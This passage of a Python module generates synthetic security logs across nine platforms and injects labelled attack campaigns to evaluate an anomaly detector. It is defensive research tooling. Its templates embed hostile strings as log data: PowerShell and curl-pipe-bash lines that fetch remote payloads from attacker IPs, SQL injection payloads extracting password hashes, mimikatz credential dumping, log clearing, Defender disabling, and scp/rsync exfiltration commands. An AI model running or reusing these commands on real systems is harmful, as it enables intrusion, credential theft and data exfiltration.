"""Synthetic multi-source log corpus generator.

The paper's Extended Dataset (42 940 logs, nine platforms) and its attack
campaigns are not publicly released by the authors.  This module rebuilds a
corpus with exactly the per-platform volumes and anomaly ratios of Table V and
with log syntax that follows the public benchmarks named in Section IV-A
(HDFS/BGL/OpenStack/Windows from LogHub, Apache, pfSense, MySQL, sshd, Unbound).

Attack campaigns are injected per platform; every anomalous record carries a
ground-truth MITRE ATT&CK stage and campaign id, which are used *only* for
evaluation, never by the detector.
"""
from __future__ import annotations

import csv
import random
import re
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Tuple

import numpy as np

from . import config

# ---------------------------------------------------------------------------
# Benign templates: (level_hint, body)
# ---------------------------------------------------------------------------
BENIGN_TEMPLATES: Dict[str, List[Tuple[str, str]]] = {
    "HDFS": [
        ("INFO", "dfs.DataNode$DataXceiver: Receiving block blk_{blk} src: /{ip}:{port} dest: /{ip}:50010"),
        ("INFO", "dfs.DataNode$DataXceiver: Received block blk_{blk} of size {size} from /{ip}"),
        ("INFO", "dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: {ip}:50010 is added to blk_{blk} size {size}"),
        ("INFO", "dfs.FSDataset: Writing block blk_{blk} to /data/dfs/data/current/subdir{shard}"),
        ("WARN", "dfs.DataNode$DataXceiver: Slow BlockReceiver write packet to mirror took {ms}ms"),
        ("WARN", "dfs.DataNode$DataXceiver: IOException in BlockReceiver.run"),
        ("ERROR", "dfs.DataNode$DataXceiver: Failed to read block blk_{blk} from disk, retrying"),
        ("INFO", "dfs.FSNamesystem: BLOCK* ask {ip}:50010 to delete blk_{blk}"),
    ],
    "BGL": [
        ("INFO", "R02-M1-N0-C:J12-U11 RAS KERNEL INFO instruction cache parity error corrected"),
        ("INFO", "R23-M0-N1-C:J08-U01 RAS KERNEL INFO CE sym {n}, at {mask}, mask {mask}"),
        ("INFO", "R02-M1-N0-C:J12-U11 RAS KERNEL INFO generating core.6291"),
        ("WARN", "R06-M1-N0-C:J14-U01 RAS KERNEL WARNING general protection fault at address {mask}"),
        ("INFO", "R12-M0-N0-C:J05-U01 RAS KERNEL INFO Kernel detected an interrupt {n}"),
        ("ERROR", "R12-M0-N0-C:J05-U01 RAS KERNEL ERROR dd1 timeout, retrying"),
        ("INFO", "R30-M1-N1-C:J11-U01 RAS KERNEL INFO app job {n} completed successfully"),
        ("WARN", "R30-M1-N1-C:J11-U01 RAS KERNEL WARN torus link degraded, rerouting traffic"),
    ],
    "OpenStack": [
        ("INFO", "[nova.api.openstack.compute.servers] GET /v2.1/{tenant}/servers/detail 200 OK"),
        ("INFO", "[nova.compute.manager] VM {uuid} spawned successfully on host compute-{shard}"),
        ("INFO", "[nova.scheduler.filter_scheduler] Selecting host compute-{shard} for instance {uuid}"),
        ("INFO", "[keystone.assignment] Granted role member to user {user} on project {tenant}"),
        ("WARN", "[nova.compute.manager] Instance {uuid} is taking a long time to boot"),
        ("ERROR", "[nova.compute.manager] Instance {uuid} failed to spawn: timeout"),
        ("INFO", "[cinder.volume.manager] Volume {uuid} attached to instance {uuid}"),
        ("INFO", "[glance.api.v2.images] Image {uuid} uploaded, size {size}"),
    ],
    "Windows": [
        ("INFO", "Microsoft-Windows-Security-Auditing,4624,An account was successfully logged on. Subject: Security ID S-1-5-18 Account Name {user} Logon Type 2"),
        ("INFO", "Microsoft-Windows-Security-Auditing,4634,An account was logged off. Account Name {user} Logon Type 2"),
        ("INFO", "Microsoft-Windows-Kernel-General,12,The operating system started at system time 2024-03-12T08:00:00Z"),
        ("WARN", "Microsoft-Windows-Security-Auditing,4625,An account failed to log on. Account Name {user} Failure Reason: Unknown user name or bad password Logon Type 2"),
        ("INFO", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Process Name: C:\\Windows\\System32\\svchost.exe"),
        ("ERROR", "Microsoft-Windows-DistributedCOM,10016,The application-specific permission settings do not grant Local Activation permission for CLSID {uuid}"),
        ("INFO", "Microsoft-Windows-Security-Auditing,4672,Special privileges assigned to new logon. Account Name {user} Privileges: SeSecurityPrivilege SeBackupPrivilege"),
        ("INFO", "Microsoft-Windows-TaskScheduler,201,Task Scheduler launched task \\Microsoft\\Windows\\UpdateAssistant at time 2024-03-12T09:00:00Z"),
    ],
    "Apache": [
        ("INFO", '"{method} /index.html HTTP/1.1" 200 {size}'),
        ("INFO", '"{method} /assets/app.{ext} HTTP/1.1" 200 {size}'),
        ("INFO", '"{method} /api/v1/status HTTP/1.1" 200 512'),
        ("WARN", '"{method} /favicon.ico HTTP/1.1" 404 209'),
        ("WARN", '"{method} /old/dashboard.php HTTP/1.1" 403 {size}'),
        ("ERROR", '"{method} /api/v1/report HTTP/1.1" 500 1024'),
        ("INFO", '"{method} /login HTTP/1.1" 302 0'),
        ("WARN", '"{method} /healthz HTTP/1.1" 400 226'),
    ],
    "Firewall": [
        ("INFO", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,{ip},{ip2},443,{port}"),
        ("INFO", "5,,,1000000103,em0,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,60,{ip},{ip2},{port},443"),
        ("INFO", "6,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,17,udp,76,{ip},{ip2},53,{port}"),
        ("INFO", "5,,,1000000103,em1,match,pass,in,4,0x0,,128,{n},0,DF,6,tcp,52,{ip},{ip2},22,{port}"),
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,{ip},{ip2},{port},23"),
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,{ip},{ip2},{port},3389"),
        ("INFO", "5,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,60,{ip},{ip2},443,{port}"),
    ],
    "Database": [
        ("INFO", "Query SELECT id, name, email FROM users WHERE id = {n}"),
        ("INFO", "Query INSERT INTO sessions (token, user_id) VALUES ('{hex}', {n})"),
        ("INFO", "Query UPDATE accounts SET last_login = NOW() WHERE user_id = {n}"),
        ("WARN", "Query SELECT * FROM orders WHERE status = 'pending' -- slow query {ms}ms"),
        ("ERROR", "Query SELECT name FROM products WHERE sku = '{hex}' -- duplicate key error"),
        ("INFO", "Connect {user}@localhost on app_db using TCP/IP"),
        ("INFO", "Query BEGIN"),
        ("INFO", "Query COMMIT"),
    ],
    "SSH": [
        ("INFO", "Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{hex}"),
        ("INFO", "Received disconnect from {ip} port {port}:11: disconnected by user"),
        ("INFO", "pam_unix(sshd:session): session opened for user {user} by (uid=0)"),
        ("WARN", "Invalid user {user} from {ip} port {port}"),
        ("WARN", "Connection closed by authenticating user {user} {ip} port {port} [preauth]"),
        ("ERROR", "error: kex_exchange_identification: Connection closed by remote host"),
        ("INFO", "pam_unix(sshd:session): session closed for user {user}"),
    ],
    "DNS": [
        ("INFO", "query: www.example.com IN A + ({ip})"),
        ("INFO", "query: api.service.internal IN A + ({ip})"),
        ("INFO", "query: cdn.assets.net IN AAAA + ({ip})"),
        ("INFO", "reply: www.example.com IN A 93.184.216.34"),
        ("WARN", "query: typo-dmain.example.com IN A + ({ip})"),
        ("WARN", "query: mail.example.com IN MX + ({ip}) NXDOMAIN"),
        ("INFO", "query: time.windows.com IN A + ({ip})"),
    ],
}

# ---------------------------------------------------------------------------
# Attack templates keyed by (platform, stage): (level_hint, body, subtle)
# ---------------------------------------------------------------------------
STAGE_TEMPLATES: Dict[Tuple[str, str], List[Tuple[str, str, bool]]] = {
    ("HDFS", "Collection"): [
        ("WARN", "dfs.FSDataset: BlockScanner initiated full scan of {n} blocks in /data/dfs/data/current", False),
        ("INFO", "dfs.FSDataset: readBlock blk_{blk} requested by client /{ip} for 10240 consecutive blocks", True),
        ("WARN", "dfs.FSDataset: Block {blk} accessed by user {user} outside allowed audit scope", True),
    ],
    ("HDFS", "Exfiltration"): [
        ("INFO", "dfs.DataNode$DataXceiver: Sending block blk_{blk} to /{ip}:{port} size 268435456 bytes", False),
        ("WARN", "dfs.DataNode$DataXceiver: Transfer of blk_{blk} to external host {ip} exceeded quota", False),
        ("INFO", "dfs.DataNode$DataXceiver: opReadBlock blk_{blk} of size 134217728 to /{ip}", True),
    ],
    ("HDFS", "Impact"): [
        ("ERROR", "dfs.FSNamesystem: Meta file for blk_{blk} is corrupt, deleting block and replicas", False),
        ("ERROR", "dfs.FSDataset: Failed to delete block blk_{blk}, volume failure on /data/dfs/data", False),
        ("WARN", "dfs.FSDataset: Rolling back block blk_{blk} and invalidating all replicas", True),
    ],
    ("BGL", "Impact"): [
        ("ERROR", "R02-M1-N0-C:J12-U11 RAS KERNEL FATAL data TLB error interrupt, node halted", False),
        ("ERROR", "R23-M0-N1-C:J08-U01 RAS KERNEL ERROR double-hummer alignment exceptions in rank {n}", False),
        ("WARN", "R06-M1-N0-C:J14-U01 RAS KERNEL WARN memory card {n} marked for service", True),
    ],
    ("OpenStack", "Discovery"): [
        ("INFO", "[nova.api.openstack.compute.servers] GET /v2.1/{tenant}/servers/detail 200 OK, 5000 records", False),
        ("WARN", "[keystone.assignment] Listing all projects and role assignments for user {user}", False),
        ("INFO", "[nova.api.openstack.compute.hypervisors] GET /v2.1/{tenant}/os-hypervisors/detail 200", True),
    ],
    ("OpenStack", "Persistence"): [
        ("WARN", "[keystone.assignment] Application credential created for user {user} without expiry", False),
        ("INFO", "[glance.api.v2.images] Image {uuid} uploaded as public snapshot backdoor", False),
        ("INFO", "[nova.api.openstack] Keypair injected into instance {uuid} for user {user}", True),
    ],
    ("OpenStack", "Privilege Escalation"): [
        ("WARN", "[keystone.assignment] Role admin granted to user {user} by {user}", False),
        ("WARN", "[nova.policy] Policy check bypassed for action os_compute_api:servers:delete", False),
        ("INFO", "[keystone.assignment] Group {tenant} added to project admin role", True),
    ],
    ("OpenStack", "Impact"): [
        ("ERROR", "[nova.compute.manager] Instance {uuid} deleted by unauthenticated request", False),
        ("ERROR", "[cinder.volume.manager] Volume {uuid} detached and wiped, data loss detected", False),
        ("WARN", "[nova.compute.manager] Instance {uuid} resized to zero flavor, service degraded", True),
    ],
    ("Windows", "Initial Access"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4625,An account failed to log on. Account Name administrator Failure Reason: Unknown user name or bad password Logon Type 3 Source Network Address {ip}", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4625,An account failed to log on. Account Name admin Failure Reason: Unknown user name or bad password Logon Type 10", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4624,An account was successfully logged on. Account Name svc_backup Logon Type 3 Source Network Address {ip} Workstation {host}", True),
    ],
    ("Windows", "Execution"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Command Line: powershell -enc {b64}", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Process Name: C:\\Windows\\Temp\\{hex}.exe Parent: cmd.exe", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Process Name: C:\\Windows\\System32\\cmd.exe Command Line: cmd /c whoami /all", True),
    ],
    ("Windows", "Persistence"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4698,A scheduled task was created. Task Name: \\Updater Task Content: schtasks /create /tn Updater /tr C:\\Users\\Public\\upd.exe /sc minute /mo 5", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4720,A user account was created. Account Name: support_new Group: Administrators", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4697,A service was installed. Service Name: WinDefendHelper Image: C:\\ProgramData\\svc.exe", True),
    ],
    ("Windows", "Privilege Escalation"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4672,Special privileges assigned to new logon. Account Name {user} Privileges: SeDebugPrivilege SeTcbPrivilege SeLoadDriverPrivilege", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4732,A member was added to a security-enabled local group. Group: Administrators Member: {user}", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4673,A privileged service was called. Service: SeCreateTokenPrivilege Caller: {user}", True),
    ],
    ("Windows", "Defense Evasion"): [
        ("ERROR", "Microsoft-Windows-Eventlog,1102,The audit log was cleared. Subject: {user} Logon ID 0x3e7", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Command Line: net stop windefend && sc delete WinDefend", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Command Line: wevtutil cl Security", True),
    ],
    ("Windows", "Credential Access"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4776,The computer attempted to validate the credentials for an account. Account Name {user} Error Code 0xc000006a", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Command Line: mimikatz.exe sekurlsa::logonpasswords exit", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4663,An attempt was made to access an object. Object: C:\\Windows\\NTDS\\ntds.dit Access: ReadData", True),
    ],
    ("Windows", "Lateral Movement"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4624,An account was successfully logged on. Logon Type 3 Account Name {user} Source Network Address 10.0.0.{shard} Workstation {host}", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,5140,A network share object was accessed. Share: \\\\{host}\\ADMIN$ Access: ReadWrite", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4624,An account was successfully logged on. Logon Type 9 Account Name {user} Source Network Address 10.0.0.{shard}", True),
    ],
    ("Windows", "Collection"): [
        ("WARN", "Microsoft-Windows-Security-Auditing,4663,An attempt was made to access an object. Object: C:\\Finance\\payroll_2024.xlsx Access: ReadData", False),
        ("WARN", "Microsoft-Windows-Security-Auditing,4688,A new process has been created. Command Line: 7z.exe a -r C:\\Users\\Public\\a.7z C:\\Finance", False),
        ("INFO", "Microsoft-Windows-Security-Auditing,4663,An attempt was made to access an object. Object: D:\\Shares\\HR Access: ReadAttributes", True),
    ],
    ("Apache", "Discovery"): [
        ("WARN", '"GET /phpmyadmin/ HTTP/1.1" 404 209'),
        ("WARN", '"GET /.git/config HTTP/1.1" 404 209'),
        ("INFO", '"GET /admin/ HTTP/1.1" 403 199'),
    ],
    ("Apache", "Initial Access"): [
        ("WARN", "\"GET /item.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20HTTP/1.1\" 200 4096"),
        ("WARN", "\"POST /login.php HTTP/1.1\" 200 512 (body username=admin'-- password=x)"),
        ("INFO", "\"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 733"),
    ],
    ("Apache", "Execution"): [
        ("WARN", '"GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 42'),
        ("WARN", '"POST /uploads/x.php HTTP/1.1" 200 12 (multipart webshell upload)'),
        ("INFO", '"GET /cgi-bin/test.cgi HTTP/1.1" 200 88'),
    ],
    ("Apache", "Exfiltration"): [
        ("WARN", '"GET /download?file=../../../../etc/passwd HTTP/1.1" 200 4096'),
        ("WARN", '"GET /backup/db.sql.gz HTTP/1.1" 200 52428800'),
        ("INFO", '"GET /reports/export.csv HTTP/1.1" 200 10485760'),
    ],
    ("Apache", "Impact"): [
        ("ERROR", '"POST /api/admin/delete_all HTTP/1.1" 500 1024'),
        ("ERROR", '"GET /index.php?op=shutdown HTTP/1.1" 500 512'),
        ("WARN", '"POST /api/v1/flush_cache?force=1 HTTP/1.1" 200 64'),
    ],
    ("Firewall", "Discovery"): [
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,203.0.113.{shard},10.0.0.10,21,{port}"),
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,203.0.113.{shard},10.0.0.10,22,{port}"),
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,203.0.113.{shard},10.0.0.10,3306,{port}"),
    ],
    ("Firewall", "Initial Access"): [
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,203.0.113.{shard},10.0.0.12,3389,{port}"),
        ("WARN", "5,,,1000000103,em0,match,block,in,4,0x0,,64,{n},0,DF,6,tcp,60,203.0.113.{shard},10.0.0.12,445,{port}"),
        ("INFO", "5,,,1000000103,em0,match,pass,in,4,0x0,,64,{n},0,DF,6,tcp,60,203.0.113.{shard},10.0.0.12,8080,{port}"),
    ],
    ("Firewall", "Command and Control"): [
        ("WARN", "5,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,60,10.0.0.5,45.33.12.9,8443,{port}"),
        ("WARN", "6,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,17,udp,76,10.0.0.5,45.33.12.9,53,{port}"),
        ("INFO", "5,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,60,10.0.0.5,198.51.100.9,443,{port}"),
    ],
    ("Firewall", "Exfiltration"): [
        ("WARN", "5,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,60,10.0.0.5,198.51.100.9,4444,{port}"),
        ("WARN", "5,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,1514,10.0.0.5,198.51.100.9,22,{port}"),
        ("INFO", "5,,,1000000103,em1,match,pass,out,4,0x0,,64,{n},0,DF,6,tcp,60,10.0.0.5,198.51.100.9,443,{port}"),
    ],
    ("Database", "Initial Access"): [
        ("WARN", "Query SELECT * FROM users WHERE username = 'admin' OR '1'='1' --"),
        ("WARN", "Query SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM mysql.user"),
        ("INFO", "Connect root@{ip} on app_db using TCP/IP (passwordless)"),
    ],
    ("Database", "Collection"): [
        ("WARN", "Query SELECT card_number, cvv, expiry FROM payments LIMIT 100000"),
        ("WARN", "Query SELECT * FROM customers ORDER BY id DESC LIMIT 500000"),
        ("INFO", "Query SELECT COUNT(*) FROM orders WHERE 1=1"),
    ],
    ("Database", "Exfiltration"): [
        ("WARN", "Query SELECT * FROM users INTO OUTFILE '/tmp/dump.csv'"),
        ("WARN", "Query SELECT * FROM orders INTO DUMPFILE '/var/www/html/o.bin'"),
        ("INFO", "Query SELECT email FROM newsletter LIMIT 200000"),
    ],
    ("Database", "Credential Access"): [
        ("WARN", "Query SELECT username, authentication_string FROM mysql.user"),
        ("ERROR", "Connect Access denied for user 'root'@'10.0.0.{shard}' (using password: YES)"),
        ("INFO", "Query SELECT * FROM accounts WHERE password LIKE 'a%'"),
    ],
    ("Database", "Impact"): [
        ("ERROR", "Query DROP TABLE orders"),
        ("ERROR", "Query UPDATE products SET price = 0"),
        ("WARN", "Query DELETE FROM customers WHERE 1=1"),
    ],
    ("SSH", "Discovery"): [
        ("WARN", "Invalid user admin from {ip} port {port}"),
        ("WARN", "Invalid user test from {ip} port {port}"),
        ("INFO", "Connection closed by {ip} port {port} [preauth]"),
    ],
    ("SSH", "Credential Access"): [
        ("WARN", "Failed password for invalid user root from {ip} port {port} ssh2"),
        ("WARN", "Failed password for {user} from {ip} port {port} ssh2 (attempt {n})"),
        ("WARN", "message repeated {n} times: [ Failed password for invalid user oracle from {ip} port {port} ssh2]"),
    ],
    ("SSH", "Lateral Movement"): [
        ("INFO", "Accepted publickey for deploy from 10.0.0.{shard} port {port} ssh2"),
        ("INFO", "Accepted password for {user} from 10.0.0.{shard} port {port} ssh2"),
        ("INFO", "Received disconnect from 10.0.0.{shard} port {port}:11: disconnected by user"),
    ],
    ("SSH", "Persistence"): [
        ("WARN", "pam_unix(sshd:session): session opened for user root by (uid=0) COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys"),
        ("WARN", "Accepted publickey for backdoor from {ip} port {port} ssh2"),
        ("INFO", "pam_unix(sshd:session): session opened for user {user} by (uid=0) COMMAND=/usr/bin/crontab -e"),
    ],
    ("SSH", "Privilege Escalation"): [
        ("WARN", "sudo: {user} : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash"),
        ("WARN", "sudo: {user} : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/passwd"),
        ("INFO", "pam_unix(sudo:session): session opened for user root by {user}(uid=1000)"),
    ],
    ("SSH", "Exfiltration"): [
        ("WARN", "sudo: {user} : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/scp -r /var/backups root@{ip}:/tmp/"),
        ("WARN", "session opened for user {user} by (uid=0) COMMAND=/usr/bin/rsync -a /data {ip}::exfil"),
        ("INFO", "Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{hex}"),
    ],
    ("DNS", "Discovery"): [
        ("WARN", "query: version.bind IN TXT + ({ip})"),
        ("WARN", "query: {rand}.example.com IN A + ({ip})"),
        ("INFO", "query: internal.corp IN AXFR + ({ip})"),
    ],
    ("DNS", "Command and Control"): [
        ("WARN", "query: {sub}.c2.example.net IN TXT + (10.0.0.5)"),
        ("WARN", "query: {sub}.beacon.example.org IN AAAA + (10.0.0.5)"),
        ("INFO", "query: {rand}.sync.example.net IN A + (10.0.0.5)"),
    ],
    ("DNS", "Exfiltration"): [
        ("WARN", "query: {sub}.exfil.example.org IN TXT + (10.0.0.5)"),
        ("WARN", "query: {sub}.{sub}.drop.example.net IN TXT + (10.0.0.5)"),
        ("INFO", "query: {sub}.cdn.example.org IN A + (10.0.0.5)"),
    ],
    ("DNS", "Impact"): [
        ("ERROR", "query: example.com IN A + ({ip}) SERVFAIL  (rate limit exceeded)"),
        ("ERROR", "query: {rand}.example.com IN A + ({ip}) SERVFAIL"),
        ("WARN", "query: {rand}.example.com IN A + ({ip}) REFUSED"),
    ],
}

# Campaign stage sequences per platform (ground truth attack chains).
CAMPAIGNS: Dict[str, List[List[str]]] = {
    "HDFS": [["Collection", "Exfiltration", "Impact"], ["Collection", "Impact"], ["Impact"]],
    "BGL": [["Impact"], ["Impact", "Impact"]],
    "OpenStack": [["Discovery", "Persistence", "Impact"],
                  ["Discovery", "Privilege Escalation", "Impact"],
                  ["Discovery", "Impact"]],
    "Windows": [["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Defense Evasion"],
                ["Credential Access", "Lateral Movement", "Collection"],
                ["Initial Access", "Execution", "Credential Access"]],
    "Apache": [["Discovery", "Initial Access", "Execution", "Exfiltration"],
               ["Initial Access", "Execution", "Impact"],
               ["Discovery", "Initial Access"]],
    "Firewall": [["Discovery", "Initial Access", "Command and Control"],
                 ["Command and Control", "Exfiltration"],
                 ["Discovery", "Command and Control"]],
    "Database": [["Initial Access", "Collection", "Exfiltration"],
                 ["Credential Access", "Impact"],
                 ["Initial Access", "Collection"]],
    "SSH": [["Discovery", "Credential Access", "Lateral Movement", "Persistence"],
            ["Credential Access", "Privilege Escalation", "Exfiltration"],
            ["Discovery", "Credential Access", "Privilege Escalation"]],
    "DNS": [["Discovery", "Command and Control", "Exfiltration"],
            ["Command and Control"],
            ["Discovery", "Exfiltration"]],
}

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
          "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
_INVALID_TS = ["0000-00-00 00:00:00", "N/A", "1970-01-01 00:00:00", "-"]

# Realistic long payload fragments attached to overt attack records: attack
# artefacts (encoded commands, injected SQL, tunnel labels) are markedly more
# verbose than routine log lines.
LONG_PAYLOAD = {
    "HDFS": "volume=/data/dfs/data/current/blk_{blk} genstamp={n} checksum=CRC32C:{hex}{hex}",
    "BGL": "rank={shard} core={n} firmware=0x{hex} ras_register=0x{hex} ras_status=0x{hex}",
    "OpenStack": "request_id=req-{uuid} user_agent=python-novaclient tenant={tenant} project_domain=default",
    "Windows": "ParentProcessName: C:\\Windows\\System32\\cmd.exe CommandLine: powershell.exe -nop -w hidden -c "
               "IEX (New-Object Net.WebClient).DownloadString('http://45.33.12.9/a.ps1') IntegrityLevel: High",
    "Apache": "referer=http://evil.example/bot?redirect=/../../etc/shadow user_agent=sqlmap/1.8.3#stable",
    "Firewall": "tracker={n} rule=wan-allow-lowports label=user-defined-rule srcport={port} "
                "dstport=443 flags=0x1b seq={n} ack={n}",
    "Database": "/*!50000 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT authentication_string "
                "FROM mysql.user LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) */",
    "SSH": "COMMAND=/usr/bin/curl -s http://45.33.12.9/stage2.sh | bash; chmod +x /tmp/.x; /tmp/.x",
    "DNS": "({ip}) (udp) (size=512) (ttl=0) (authority=exfil.example.org)",
}


def _sample_level(rng: random.Random, subtle: bool) -> str:
    if subtle:
        return "INFO"
    r = rng.random()
    acc = 0.0
    for level, p in config.ANOMALY_LEVEL_DIST.items():
        acc += p
        if r <= acc:
            return level
    return "ERROR"


def _force_level(platform: str, level: str, body: str) -> str:
    """Rewrite the level marker embedded in the platform's log syntax."""
    if platform == "BGL":
        return re.sub(r"(RAS KERNEL )(INFO|WARN|WARNING|ERROR|FATAL)",
                      lambda m: m.group(1) + level, body, count=1)
    if platform == "Apache":
        code = {"ERROR": "500", "WARN": "403", "INFO": "200"}[level]
        return re.sub(r'"\s+(\d{3})\s+(\d+)',
                      lambda m: f'" {code} {m.group(2)}', body, count=1)
    if platform == "Firewall":
        # pfSense filterlog encodes the syslog severity in the first field.
        sev = {"ERROR": "3", "WARN": "4", "INFO": "5"}[level]
        return re.sub(r"^(\d),", f"{sev},", body, count=1)
    return body


def _add_payload(platform: str, body: str, ctx: dict, rng: random.Random) -> str:
    if rng.random() >= config.LONG_PAYLOAD_PROB:
        return body
    return body + " " + LONG_PAYLOAD[platform].format(**ctx)


def stage_variants(platform: str, stage: str) -> List[Tuple[str, str, bool]]:
    """Normalise templates to (level, body, is_subtle).

    Entries written without an explicit flag are treated as follows: the final
    variant of every stage is the low-salience (subtle) one, the rest are overt.
    """
    raw = STAGE_TEMPLATES[(platform, stage)]
    out: List[Tuple[str, str, bool]] = []
    for i, variant in enumerate(raw):
        lvl, body = variant[0], variant[1]
        flag = bool(variant[2]) if len(variant) > 2 else (i == len(raw) - 1)
        out.append((lvl, body, flag))
    return out


def format_ts(platform: str, dt: datetime) -> str:
    if platform == "HDFS":
        return dt.strftime("%y%m%d %H%M%S")
    if platform == "BGL":
        return dt.strftime("%Y.%m.%d-%H.%M.%S") + f".{dt.microsecond // 1000:03d}"
    if platform in ("OpenStack", "Windows"):
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    if platform == "Apache":
        return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    if platform in ("Firewall", "SSH"):
        return dt.strftime("%b %d %H:%M:%S")
    if platform == "Database":
        return dt.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"
    if platform == "DNS":
        return dt.strftime("%d-%b-%Y %H:%M:%S.%f")[:-3]
    raise ValueError(platform)


def _render(platform: str, dt: datetime, level: str, body: str, ctx: dict) -> str:
    ts = format_ts(platform, dt)
    if platform == "HDFS":
        return f"{ts} {ctx['pid']:03d} {level} {body}"
    if platform == "BGL":
        return (f"- {int(dt.timestamp())} {dt.strftime('%Y.%m.%d')} {ctx['node']} "
                f"{ts} {body}")
    if platform == "OpenStack":
        return f"{ts} {ctx['pid']} {level} {body}"
    if platform == "Windows":
        win_level = {"ERROR": "Error", "WARN": "Warning", "INFO": "Info"}[level]
        return f"{ts},{win_level},{body}"
    if platform == "Apache":
        return (f'{ctx["client"]} - - [{ts}] {body} "-" '
                f'"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"')
    if platform == "Firewall":
        return f"{ts} pfSense filterlog: {body}"
    if platform == "Database":
        return f"{ts} {ctx['thread']} {body}"
    if platform == "SSH":
        return f"{ts} {ctx['host']} sshd[{ctx['pid']}]: {body}"
    if platform == "DNS":
        return f"{ts} info: {ctx['pid']}: {body}"
    raise ValueError(platform)


def _make_ctx(rng: random.Random) -> dict:
    octet = rng.randint(2, 250)
    return {
        "ip": f"{rng.choice(['10.0.0', '192.168.1', '172.16.4'])}.{octet}",
        "ip2": f"10.0.0.{rng.randint(1, 30)}",
        "client": f"{rng.choice(['10.0.0', '192.168.1', '203.0.113'])}.{octet}",
        "port": rng.randint(1024, 65535),
        "user": rng.choice(["admin", "deploy", "app", "svc_backup", "ops", "guest"]),
        "host": f"srv-{rng.randint(1, 40):02d}",
        "node": f"R{rng.randint(1, 30):02d}-M{rng.randint(0, 1)}-N{rng.randint(0, 1)}-C:J{rng.randint(1, 16):02d}-U{rng.randint(1, 11):02d}",
        "tenant": f"proj-{rng.randint(1000, 9999)}",
        "shard": rng.randint(1, 30),
        "pid": rng.randint(100, 99999),
        "thread": rng.randint(2, 500),
        "blk": f"{rng.randint(-10**18, 10**18)}",
        "uuid": f"{rng.getrandbits(32):08x}-{rng.getrandbits(16):04x}-{rng.getrandbits(16):04x}",
        "size": rng.choice([67108864, 134217728, 268435456, 52428800]),
        "n": rng.randint(1, 100000),
        "ms": rng.randint(50, 5000),
        "mask": f"0x{rng.getrandbits(32):08x}",
        "hex": f"{rng.getrandbits(64):016x}",
        "b64": "".join(rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
                       for _ in range(48)),
        "method": rng.choice(["GET", "POST", "HEAD"]),
        "ext": rng.choice(["js", "css", "png", "woff2"]),
        "rand": f"{rng.getrandbits(40):010x}",
        "sub": "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(40)),
    }


@dataclass
class LogRecord:
    log_id: str
    platform: str
    timestamp_text: str
    raw: str
    label: int
    stage: int
    campaign: str = ""
    attack_type: str = ""
